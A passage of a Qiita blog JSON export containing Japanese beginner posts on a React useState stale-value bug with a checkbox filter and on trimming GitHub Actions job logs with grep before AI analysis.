参考\nhttps://github.com/supabase/supabase/issues/4274\n\n","coediting":false,"comments_count":0,"created_at":"2025-06-07T12:43:08+09:00","group":null,"id":"1ba7cfc3496a55e0e897","likes_count":1,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"Query","versions":[]},{"name":"Supabase","versions":[]}],"title":"【Supabase】条件によってwhere句を動的に変更したい","updated_at":"2025-06-07T12:43:08+09:00","url":"https://qiita.com/asa129/items/1ba7cfc3496a55e0e897","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":390,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:222\">チェックボックスのチェックした値でフィルターをかけようとしたところ、期待値通りのフィルタリングができませんでした。備忘録として解決方法をまとめます。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"5:1-5:186\">チェックボックスをチェックした時にフィルタリングできるようしたいが、チェックを外したときにフィルタリングが適用されてしまう。</p>\n<h1 data-sourcepos=\"7:1-7:8\">\n<span id=\"原因\" class=\"fragment\"></span><a href=\"#%E5%8E%9F%E5%9B%A0\"><i class=\"fa fa-link\"></i></a>原因</h1>\n<p data-sourcepos=\"8:1-9:121\">チェック時の値をuseStateでセットする前に、データ取得処理が実行されていた。<br>\nsetGenreIdで値を更新する際、即座に反映されず、関数（handleChange）実行後に反映されます。</p>\n<p data-sourcepos=\"11:1-11:40\"><strong>公式ドキュメントより引用</strong></p>\n<blockquote data-sourcepos=\"12:1-12:90\">\n<p data-sourcepos=\"12:2-12:90\">set 関数の呼び出しは、実行中のコードの state を変化させません。</p>\n</blockquote>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"15:1-29:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// チェックボックスの状態管理</span>\n<span class=\"kd\">const</span> <span class=\"p\">[</span><span class=\"nx\">genreId</span><span class=\"p\">,</span> <span class=\"nx\">setGenreId</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nx\">useState</span><span class=\"o\">&lt;</span><span class=\"kr\">string</span><span class=\"p\">[]</span><span class=\"o\">&gt;</span><span class=\"p\">([]);</span>\n\n<span class=\"c1\">// チェックボックスの変更ハンドラー</span>\n<span class=\"kd\">const</span> <span class=\"nx\">handleChange</span> <span class=\"o\">=</span> <span class=\"k\">async </span><span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">:</span> <span class=\"nx\">React</span><span class=\"p\">.</span><span class=\"nx\">ChangeEvent</span><span class=\"o\">&lt;</span><span class=\"nx\">HTMLInputElement</span><span class=\"o\">&gt;</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">.</span><span class=\"nx\">target</span><span class=\"p\">.</span><span class=\"nx\">checked</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nf\">setGenreId</span><span class=\"p\">([...</span><span class=\"nx\">genreId</span><span class=\"p\">,</span> <span class=\"nx\">e</span><span class=\"p\">.</span><span class=\"nx\">target</span><span class=\"p\">.</span><span class=\"nx\">value</span><span class=\"p\">]);</span>\n  <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>\n    <span class=\"nf\">setGenreId</span><span class=\"p\">(</span><span class=\"nx\">genreId</span><span class=\"p\">.</span><span class=\"nf\">filter</span><span class=\"p\">((</span><span class=\"nx\">id</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"nx\">id</span> <span class=\"o\">!==</span> <span class=\"nx\">e</span><span class=\"p\">.</span><span class=\"nx\">target</span><span class=\"p\">.</span><span class=\"nx\">value</span><span class=\"p\">));</span>\n  <span class=\"p\">}</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">searchByGenresData</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nf\">getDataByGenres</span><span class=\"p\">(</span><span class=\"nx\">genreId</span><span class=\"p\">);</span> <span class=\"c1\">//←setGenreIdの値は更新されていない、古い値を設定している</span>\n  <span class=\"nf\">setData</span><span class=\"p\">(</span><span class=\"nx\">searchByGenresData</span><span class=\"p\">);</span>\n<span class=\"p\">};</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"31:1-31:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<h4 data-sourcepos=\"32:1-32:34\">\n<span id=\"1-useeffectを使用する\" class=\"fragment\"></span><a href=\"#1-useeffect%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>1. <code>useEffect</code>を使用する</h4>\n<div class=\"code-frame\" data-lang=\"diff_tsx\" data-sourcepos=\"34:1-54:3\"><div class=\"highlight\"><pre><code><span class=\"hdl\"><span class=\"o\">- </span> <span class=\"kd\">const</span> <span class=\"nx\">handleChange</span> <span class=\"o\">=</span> <span class=\"k\">async </span><span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">:</span> <span class=\"nx\">React</span><span class=\"p\">.</span><span class=\"nx\">ChangeEvent</span><span class=\"o\">&lt;</span><span class=\"nx\">HTMLInputElement</span><span class=\"o\">&gt;</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span> <span class=\"kd\">const</span> <span class=\"nx\">handleChange</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"na\">e</span><span class=\"p\">:</span> <span class=\"nx\">React</span><span class=\"p\">.</span><span class=\"nx\">ChangeEvent</span><span class=\"o\">&lt;</span><span class=\"nx\">HTMLInputElement</span><span class=\"o\">&gt;</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n</span>    <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">.</span><span class=\"nx\">target</span><span class=\"p\">.</span><span class=\"nx\">checked</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"nf\">setGenreId</span><span class=\"p\">([...</span><span class=\"nx\">genreId</span><span class=\"p\">,</span> <span class=\"nx\">e</span><span class=\"p\">.</span><span class=\"nx\">target</span><span class=\"p\">.</span><span class=\"nx\">value</span><span class=\"p\">]);</span>\n    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>\n      <span class=\"nf\">setGenreId</span><span class=\"p\">(</span><span class=\"nx\">genreId</span><span class=\"p\">.</span><span class=\"nf\">filter</span><span class=\"p\">((</span><span class=\"nx\">id</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"nx\">id</span> <span class=\"o\">!==</span> <span class=\"nx\">e</span><span class=\"p\">.</span><span class=\"nx\">target</span><span class=\"p\">.</span><span class=\"nx\">value</span><span class=\"p\">));</span>\n    <span class=\"p\">}</span>\n<span class=\"hdl\"><span class=\"o\">- </span> <span class=\"kd\">const</span> <span class=\"nx\">searchByGenresData</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nf\">getDataByGenres</span><span class=\"p\">(</span><span class=\"nx\">genreId</span><span class=\"p\">);</span>\n</span><span class=\"hdl\"><span class=\"o\">- </span> <span class=\"nf\">setData</span><span class=\"p\">(</span><span class=\"nx\">searchByGenresData</span><span class=\"p\">);</span>\n</span>  <span class=\"p\">};</span>\n\n<span class=\"hil\"><span class=\"o\">+ </span> <span class=\"nf\">useEffect</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>   <span class=\"kd\">const</span> <span class=\"nx\">fetchDataByGenres</span> <span class=\"o\">=</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>     <span class=\"kd\">const</span> <span class=\"nx\">searchByGenresData</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nf\">getDataByGenres</span><span class=\"p\">(</span><span class=\"nx\">genreId</span><span class=\"p\">);</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>     <span class=\"nf\">setData</span><span class=\"p\">(</span><span class=\"nx\">searchByGenresData</span><span class=\"p\">);</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>   <span class=\"p\">};</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>   <span class=\"nf\">fetchDataByGenres</span><span class=\"p\">();</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span> <span class=\"p\">},</span> <span class=\"p\">[</span><span class=\"nx\">genreId</span><span class=\"p\">]);</span>\n</span>\n</code></pre></div></div>\n<h4 data-sourcepos=\"56:1-56:38\">\n<span id=\"2-新しい変数で格納する\" class=\"fragment\"></span><a href=\"#2-%E6%96%B0%E3%81%97%E3%81%84%E5%A4%89%E6%95%B0%E3%81%A7%E6%A0%BC%E7%B4%8D%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>2. 新しい変数で格納する</h4>\n<p data-sourcepos=\"58:1-58:40\"><strong>公式ドキュメントより引用</strong></p>\n<blockquote data-sourcepos=\"59:1-59:114\">\n<p data-sourcepos=\"59:2-59:114\">次の state が必要な場合は、set 関数に渡す前に一度変数に保存することができます。</p>\n</blockquote>\n<div class=\"code-frame\" data-lang=\"diff_tsx\" data-sourcepos=\"61:1-77:3\"><div class=\"highlight\"><pre><code>  <span class=\"kd\">const</span> <span class=\"nx\">handleChange</span> <span class=\"o\">=</span> <span class=\"k\">async </span><span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">:</span> <span class=\"nx\">React</span><span class=\"p\">.</span><span class=\"nx\">ChangeEvent</span><span class=\"o\">&lt;</span><span class=\"nx\">HTMLInputElement</span><span class=\"o\">&gt;</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n<span class=\"hil\"><span class=\"o\">+ </span>   <span class=\"kd\">let</span> <span class=\"na\">newGenreId</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">[];</span>\n</span>    <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">.</span><span class=\"nx\">target</span><span class=\"p\">.</span><span class=\"nx\">checked</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n<span class=\"hdl\"><span class=\"o\">- </span>     <span class=\"nf\">setGenreId</span><span class=\"p\">([...</span><span class=\"nx\">genreId</span><span class=\"p\">,</span> <span class=\"nx\">e</span><span class=\"p\">.</span><span class=\"nx\">target</span><span class=\"p\">.</span><span class=\"nx\">value</span><span class=\"p\">]);</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>     <span class=\"nx\">newGenreId</span> <span class=\"o\">=</span> <span class=\"p\">[...</span><span class=\"nx\">genreId</span><span class=\"p\">,</span> <span class=\"nx\">e</span><span class=\"p\">.</span><span class=\"nx\">target</span><span class=\"p\">.</span><span class=\"nx\">value</span><span class=\"p\">];</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>     <span class=\"nf\">setGenreId</span><span class=\"p\">(</span><span class=\"nx\">newGenreId</span><span class=\"p\">);</span>\n</span>    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>\n<span class=\"hdl\"><span class=\"o\">- </span>     <span class=\"nf\">setGenreId</span><span class=\"p\">(</span><span class=\"nx\">genreId</span><span class=\"p\">.</span><span class=\"nf\">filter</span><span class=\"p\">((</span><span class=\"nx\">id</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"nx\">id</span> <span class=\"o\">!==</span> <span class=\"nx\">e</span><span class=\"p\">.</span><span class=\"nx\">target</span><span class=\"p\">.</span><span class=\"nx\">value</span><span class=\"p\">));</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>     <span class=\"nx\">newGenreId</span> <span class=\"o\">=</span> <span class=\"nx\">genreId</span><span class=\"p\">.</span><span class=\"nf\">filter</span><span class=\"p\">((</span><span class=\"nx\">id</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"nx\">id</span> <span class=\"o\">!==</span> <span class=\"nx\">e</span><span class=\"p\">.</span><span class=\"nx\">target</span><span class=\"p\">.</span><span class=\"nx\">value</span><span class=\"p\">);</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>     <span class=\"nf\">setGenreId</span><span class=\"p\">(</span><span class=\"nx\">newGenreId</span><span class=\"p\">);</span>\n</span>    <span class=\"p\">}</span>\n<span class=\"hdl\"><span class=\"o\">- </span>   <span class=\"kd\">const</span> <span class=\"nx\">searchByGenresData</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nf\">getDataByGenres</span><span class=\"p\">(</span><span class=\"nx\">genreId</span><span class=\"p\">);</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>   <span class=\"kd\">const</span> <span class=\"nx\">searchByGenresData</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nf\">getDataByGenres</span><span class=\"p\">(</span><span class=\"nx\">newGenreId</span><span class=\"p\">);</span>\n</span>    <span class=\"nf\">setData</span><span class=\"p\">(</span><span class=\"nx\">searchByGenresData</span><span class=\"p\">);</span>\n  <span class=\"p\">};</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"79:1-79:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"80:1-80:83\">Stateの管理、難しいです。使いこなせるようになりたいです。</p>\n<h1 data-sourcepos=\"82:1-82:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"83:1-83:102\"><iframe id=\"qiita-embed-content__59553b01b8908b751c53336a0a70de1b\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__59553b01b8908b751c53336a0a70de1b\" data-content=\"https%3A%2F%2Fja.react.dev%2Freference%2Freact%2FuseState%23ive-updated-the-state-but-logging-gives-me-the-old-value\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nチェックボックスのチェックした値でフィルターをかけようとしたところ、期待値通りのフィルタリングができませんでした。備忘録として解決方法をまとめます。\n\n# 問題\nチェックボックスをチェックした時にフィルタリングできるようしたいが、チェックを外したときにフィルタリングが適用されてしまう。\n\n# 原因\nチェック時の値をuseStateでセットする前に、データ取得処理が実行されていた。\nsetGenreIdで値を更新する際、即座に反映されず、関数（handleChange）実行後に反映されます。\n\n**公式ドキュメントより引用**\n>set 関数の呼び出しは、実行中のコードの state を変化させません。\n\n\n```tsx\n// チェックボックスの状態管理\nconst [genreId, setGenreId] = useState<string[]>([]);\n\n// チェックボックスの変更ハンドラー\nconst handleChange = async (e: React.ChangeEvent<HTMLInputElement>) => {\n  if (e.target.checked) {\n    setGenreId([...genreId, e.target.value]);\n  } else {\n    setGenreId(genreId.filter((id) => id !== e.target.value));\n  }\n  const searchByGenresData = await getDataByGenres(genreId); //←setGenreIdの値は更新されていない、古い値を設定している\n  setData(searchByGenresData);\n};\n```\n\n# 解決方法\n#### 1. `useEffect`を使用する\n\n```diff_tsx\n-  const handleChange = async (e: React.ChangeEvent<HTMLInputElement>) => {\n+  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {\n    if (e.target.checked) {\n      setGenreId([...genreId, e.target.value]);\n    } else {\n      setGenreId(genreId.filter((id) => id !== e.target.value));\n    }\n-  const searchByGenresData = await getDataByGenres(genreId);\n-  setData(searchByGenresData);\n  };\n\n+  useEffect(() => {\n+    const fetchDataByGenres = async () => {\n+      const searchByGenresData = await getDataByGenres(genreId);\n+      setData(searchByGenresData);\n+    };\n+    fetchDataByGenres();\n+  }, [genreId]);\n\n```\n\n#### 2. 新しい変数で格納する\n\n**公式ドキュメントより引用**\n>次の state が必要な場合は、set 関数に渡す前に一度変数に保存することができます。\n\n```diff_tsx\n  const handleChange = async (e: React.ChangeEvent<HTMLInputElement>) => {\n+    let newGenreId: string[];\n    if (e.target.checked) {\n-      setGenreId([...genreId, e.target.value]);\n+      newGenreId = [...genreId, e.target.value];\n+      setGenreId(newGenreId);\n    } else {\n-      setGenreId(genreId.filter((id) => id !== e.target.value));\n+      newGenreId = genreId.filter((id) => id !== e.target.value);\n+      setGenreId(newGenreId);\n    }\n-    const searchByGenresData = await getDataByGenres(genreId);\n+    const searchByGenresData = await getDataByGenres(newGenreId);\n    setData(searchByGenresData);\n  };\n```\n\n# おわりに\nStateの管理、難しいです。使いこなせるようになりたいです。\n\n# 参考\nhttps://ja.react.dev/reference/react/useState#ive-updated-the-state-but-logging-gives-me-the-old-value\n","coediting":false,"comments_count":0,"created_at":"2025-06-07T10:07:06+09:00","group":null,"id":"0339072d28413a3d6437","likes_count":2,"private":false,"reactions_count":0,"stocks_count":1,"tags":[{"name":"JavaScript","versions":[]},{"name":"初心者","versions":[]},{"name":"TypeScript","versions":[]},{"name":"React","versions":[]}],"title":"【React】CheckBoxのチェックを外したときにStateが更新される","updated_at":"2025-06-07T10:07:06+09:00","url":"https://qiita.com/asa129/items/0339072d28413a3d6437","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":667,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:90\">先日作成したワークフローで<code>Argument list too long</code>エラーが発生しました。<br>\n解決までに時間を要したので備忘録として解決方法をまとめます。</p>\n<p data-sourcepos=\"5:1-5:51\"><iframe id=\"qiita-embed-content__73cbf1d17bc8b2fa8fda6fbf576d1a5d\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__73cbf1d17bc8b2fa8fda6fbf576d1a5d\" data-content=\"https%3A%2F%2Fqiita.com%2Fasa129%2Fitems%2Fcc271dd791667844f1a5\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"7:1-7:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"8:1-8:78\">ワークフロー実行時に<code>Argument list too long</code>エラーが発生する</p>\n<p data-sourcepos=\"10:1-10:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F953c2e78-fbac-487e-a672-672ad62f787c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=332e9e58ab962a6d89a945d50255626d\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F953c2e78-fbac-487e-a672-672ad62f787c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=332e9e58ab962a6d89a945d50255626d\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F953c2e78-fbac-487e-a672-672ad62f787c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=de0392a249aee2e5631f6b716bc6f894 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/953c2e78-fbac-487e-a672-672ad62f787c.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"13:1-13:8\">\n<span id=\"原因\" class=\"fragment\"></span><a href=\"#%E5%8E%9F%E5%9B%A0\"><i class=\"fa fa-link\"></i></a>原因</h1>\n<p data-sourcepos=\"14:1-15:170\">エラー分析を行う際のログが膨大だった。<br>\nAI分析する前に、対象のログを全て取得していたため、ログの容量が大きい場合は全て取得できずにエラーとなっていました。</p>\n<h1 data-sourcepos=\"17:1-17:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"18:1-19:174\">ログからエラーメッセージのみをgrepして出力する。<br>\nエラーログを取得する処理を全量取得から、errorとして出力しているものをgrepして取得することで、ログの容量を減らしました。</p>\n<p data-sourcepos=\"21:1-21:54\">また、promptの書き方も簡潔にしました。</p>\n<div class=\"code-frame\" data-lang=\"diff_yaml\" data-sourcepos=\"23:1-99:3\"><div class=\"highlight\"><pre><code>      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Get error info</span>\n        <span class=\"na\">id</span><span class=\"pi\">:</span> <span class=\"s\">get-error</span>\n        <span class=\"na\">env</span><span class=\"pi\">:</span>\n          <span class=\"na\">GITHUB_TOKEN</span><span class=\"pi\">:</span> <span class=\"s\">${{ secrets.GITHUB_TOKEN }}</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"pi\">|</span>\n          <span class=\"s\"># ワークフローの実行IDを取得</span>\n          <span class=\"s\">RUN_ID=${{ github.event.workflow_run.id }}</span>\n          <span class=\"s\">echo \"RUN_ID: $RUN_ID\"</span>\n          <span class=\"s\"># ワークフロー情報を環境変数に保存</span>\n          <span class=\"s\">echo \"WORKFLOW_NAME=${{ github.event.workflow_run.name }}\" &gt;&gt; $GITHUB_ENV</span>\n          <span class=\"s\">echo \"BRANCH_NAME=${{ github.event.workflow_run.head_branch }}\" &gt;&gt; $GITHUB_ENV</span>\n          <span class=\"s\">echo \"COMMIT_SHA=${{ github.event.workflow_run.head_sha }}\" &gt;&gt; $GITHUB_ENV</span>\n\n          <span class=\"s\"># ジョブの一覧を取得</span>\n          <span class=\"s\">JOBS=$(gh api repos/${{ github.repository }}/actions/runs/${RUN_ID}/jobs --jq '.jobs')</span>\n\n          <span class=\"s\"># 失敗したジョブのログを取得</span>\n          <span class=\"s\">echo \"FAILED_LOGS&lt;&lt;EOF\" &gt;&gt; $GITHUB_ENV</span>\n\n          <span class=\"s\">for job in $(echo \"$JOBS\" | jq -r '.[] | select(.conclusion == \"failure\") | .id'); do</span>\n<span class=\"hdl\"><span class=\"pi\">-</span>           <span class=\"s\">echo \"=== Job ID</span><span class=\"err\">:</span> <span class=\"s\">$job ===\" &gt;&gt; $GITHUB_ENVAdd commentMore actions</span>\n</span><span class=\"hdl\"><span class=\"pi\">-</span>           <span class=\"s\">gh api repos/${{ github.repository }}/actions/jobs/${job}/logs &gt;&gt; $GITHUB_ENV 2&gt;&amp;1 || echo \"ログの取得に失敗しました\" &gt;&gt; $GITHUB_ENV</span>\n</span>            <span class=\"s\"># ジョブ名を取得</span>\n<span class=\"hil\"><span class=\"s\">+            JOB_NAME=$(echo \"$JOBS\" | jq -r --arg id \"$job\" '.[] | select(.id == ($id | tonumber)) | .name')</span>\n</span><span class=\"hil\"><span class=\"s\">+            echo \"失敗したジョブ</span><span class=\"err\">:</span> <span class=\"s\">$JOB_NAME\" &gt;&gt; $GITHUB_ENV</span>\n</span><span class=\"hil\"><span class=\"s\">+            echo \"\" &gt;&gt; $GITHUB_ENV</span>\n</span>            \n<span class=\"hil\"><span class=\"s\">+</span>            <span class=\"c1\"># エラーの部分だけを取得（最大30行）</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>          <span class=\"s\">echo \"エラー内容:\" &gt;&gt; $GITHUB_ENV</span>\n</span><span class=\"hil\"><span class=\"s\">+            gh api repos/${{ github.repository }}/actions/jobs/${job}/logs 2&gt;&amp;1 | \\</span>\n</span><span class=\"hil\"><span class=\"s\">+              grep -B 2 -A 5 -i \"error\\|fail\\|Found multiple\\|Expected\\|Received\" | \\</span>\n</span><span class=\"hil\"><span class=\"s\">+              head -30 &gt;&gt; $GITHUB_ENV || echo \"ログを取得できませんでした\" &gt;&gt; $GITHUB_ENV</span>\n</span>            \n            <span class=\"s\">echo \"\" &gt;&gt; $GITHUB_ENV</span>\n<span class=\"hil\"><span class=\"s\">+            echo \"---\" &gt;&gt; $GITHUB_ENV</span>\n</span>          <span class=\"s\">done</span>\n\n          <span class=\"s\">echo \"EOF\" &gt;&gt; $GITHUB_ENV</span>\n\n      <span class=\"s\">- name</span><span class=\"err\">:</span> <span class=\"s\">Run AI check</span>\n        <span class=\"s\">id</span><span class=\"err\">:</span> <span class=\"s\">ai-check</span>\n        <span class=\"s\">uses</span><span class=\"err\">:</span> <span class=\"s\">actions/ai-inference@v1</span>\n        <span class=\"s\">with</span><span class=\"err\">:</span>\n          <span class=\"na\">model</span><span class=\"pi\">:</span> <span class=\"s2\">\"</span><span class=\"s\">openai/gpt-4o\"</span>\n          <span class=\"na\">prompt</span><span class=\"pi\">:</span> <span class=\"pi\">|</span>\n<span class=\"hdl\"><span class=\"pi\">-</span>            <span class=\"s\">あなたは、GitHub ActionsとJavaScript/TypeScriptのテストのプロです。</span>\n</span><span class=\"hil\"><span class=\"s\">+            あなたは、GitHub ActionsとJavaScript/TypeScriptのテストのプロです。</span>\n</span>           <span class=\"s\">初心者でも理解できるように</span>\n            <span class=\"s\">以下の形式で簡潔に（全体で10行以内）説明してください。</span>\n            <span class=\"s\">エラーの内容は以下です。</span>\n\n            <span class=\"s\">**失敗したワークフロー:**</span>\n            <span class=\"s\">- ワークフロー名</span><span class=\"err\">:</span> <span class=\"s\">${{ env.WORKFLOW_NAME }}</span>\n            <span class=\"s\">- ブランチ</span><span class=\"err\">:</span> <span class=\"s\">${{ env.BRANCH_NAME }}</span>\n            <span class=\"s\">- コミットSHA</span><span class=\"err\">:</span> <span class=\"s\">${{ env.COMMIT_SHA }}</span>\n            <span class=\"s\">- 使用技術</span><span class=\"err\">:</span> <span class=\"s\">Vite, Supabase, Firebase</span>\n\n            <span class=\"s\">**エラーログ:**</span>\n            <span class=\"s\">```</span>\n            <span class=\"s\">${{ env.FAILED_LOGS }}</span>\n            <span class=\"s\">```</span>\n\n            <span class=\"s\">**回答形式フォーマット:**</span>\n            <span class=\"s\">【原因】1-2行で説明</span>\n            <span class=\"s\">【解決方法】具体的な手順を1-2個</span>\n            <span class=\"s\">【予防策】1つだけ</span>\n\n      <span class=\"s\">- name</span><span class=\"err\">:</span> <span class=\"s\">Save AI response to summary</span>\n        <span class=\"s\">if</span><span class=\"err\">:</span> <span class=\"s\">always()</span>\n        <span class=\"s\">run</span><span class=\"err\">:</span> <span class=\"pi\">|</span>\n          <span class=\"s\"># GitHub Actionsのサマリーに出力（Web UIで確認可能）</span>\n          <span class=\"s\">echo \"## 分析結果\" &gt;&gt; $GITHUB_STEP_SUMMARY</span>\n          <span class=\"s\">echo \"\" &gt;&gt; $GITHUB_STEP_SUMMARY</span>\n          <span class=\"s\">echo '${{ steps.ai-check.outputs.response }}' | base64 | base64 -d &gt;&gt; $GITHUB_STEP_SUMMARY</span>\n\n</code></pre></div></div>\n<h1 data-sourcepos=\"101:1-101:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"102:1-102:185\">promptの一行を変えるだけで、結果が大きく変わることに驚きました。AIの指示の出し方もスキルとして必要なのではと思うエラーでした。</p>\n","body":"# はじめに\n先日作成したワークフローで`Argument list too long`エラーが発生しました。\n解決までに時間を要したので備忘録として解決方法をまとめます。\n\nhttps://qiita.com/asa129/items/cc271dd791667844f1a5\n\n# 問題\nワークフロー実行時に`Argument list too long`エラーが発生する\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/953c2e78-fbac-487e-a672-672ad62f787c.png)\n\n\n# 